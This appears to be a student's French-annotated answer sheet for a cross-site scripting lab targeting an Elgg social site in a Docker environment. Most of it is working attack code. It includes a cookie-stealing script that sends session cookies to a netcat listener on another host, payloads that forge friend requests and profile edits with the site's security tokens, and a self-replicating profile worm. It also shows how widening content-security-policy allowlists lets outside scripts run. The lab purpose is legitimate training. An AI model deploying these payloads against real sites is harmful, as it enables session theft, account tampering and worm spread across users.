
Task 1. ``<script>alert('XSS');</script>``

Task 2. ``<script>alert(document.cookie);</script>``

Task 3.  nc -lknv 5555

```
<script>document.write('<img src=http://10.9.0.1:5555?c='
+ escape(document.cookie) + ' >');
</script>
```

Task 4. 
```
<p><script type="text/javascript">
window.onload = function () {
var Ajax=null;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
//Construct the HTTP request to add Samy as a friend.
var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token;
//Create and send Ajax request to add friend
Ajax=new XMLHttpRequest();
Ajax.open("GET", sendurl, true);
Ajax.send();
}
</script></p>
```

Task 5.

La requête POST de l'EDIT du profil est de la forme :

```
__elgg_token=AJGD4QJ00SGPPKfkbVEwOg&__elgg_ts=1695402086&name=Samy&description=<p><script type="text/javascript"> window.onload = function () { var Ajax=null; var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; var token="&__elgg_token="+elgg.security.token.__elgg_token; //Construct the HTTP request to add Samy as a friend. var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token; //Create and send Ajax request to add friend Ajax=new XMLHttpRequest(); 
Ajax.open("GET", sendurl, true); Ajax.send(); } </script></p> &accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid=59
```

Réponse à la task :

```
<script type="text/javascript">
window.onload = function(){
var userName="&name="+elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
var content=token+"&"+ts+"&"+userName+"&description=I have been pirated&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&"+guid;
var samyGuid=59;
var sendurl="http://www.seed-server.com/action/profile/edit";
if(elgg.session.user.guid!=samyGuid) // so that Samy's description doesn't change with the message put in the content in "description=".
{
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST", sendurl, true);
Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
Ajax.send(content);
}
}
</script>
```

à mettre dans la description (EDIT HTML) du profil de Samy dans EDIT PROFILE.

Task 6.

```
<script id="worm">
window.onload = function(){

var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
var jsCode = document.getElementById("worm").innerHTML; // only gives the content of the worm function without header and tail tags
var tailTag = "</" + "script>";
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

var userName="&name="+elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;

var content=token+"&"+ts+"&"+userName+"&description="+wormCode+"&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&"+guid;

var samyGuid=59;
var sendurl="http://www.seed-server.com/action/profile/edit";

if(elgg.session.user.guid!=samyGuid) // so that Samy's description doesn't change with the message put in the content in "description=".
{
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST", sendurl, true);
Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
Ajax.send(content);
}
}
</script>
```

Task 7.

http://www.example32a.com/ : pas de protection CSP

http://www.example32b.com/ : protections CSP via fichier de config -> sources fiables : self et tout ce qui finit par ".example70.com", même www.toto.example70.com ou www.jevaistepirater.example70.com...

http://www.example32c.com/ : protections CSP via code PHP ->sources fiables : self, tout ce qui a comme nonce : 111-111-111, et tout ce qui finit par ".example70.com", même www.toto.example70.com ou www.jevaistepirater.example70.com/importerWorm.js...

Config changée pour www.example32b.com : 

```
script-src 'self' *.example70.com *.example60.com \
```

puis sauvegarder le fichier, puis :

```
docker cp apache_csp.conf idContainer:/etc/apache2/sites-available // ne marche que si on se trouve actuellement dans le répertoire Labsetup/image_www, sinon modifier le chemin vers le premier fichier
```

Et enfin :

```
docksh idContainer
service apache2 restart
```

Code changé pour www.example32c.com :

```
"script-src 'self' 'nonce-111-111-111' 'nonce-222-222-222' *.example60.com *.example70.com"
```

puis sauvegarder le fichier, puis :

```
docker cp phpindex.php idContainer:/var/www/csp/phpindex.php // ne marche que si on se trouve actuellement dans le répertoire Labsetup/image_www/csp, sinon modifier le chemin vers le premier fichier
```

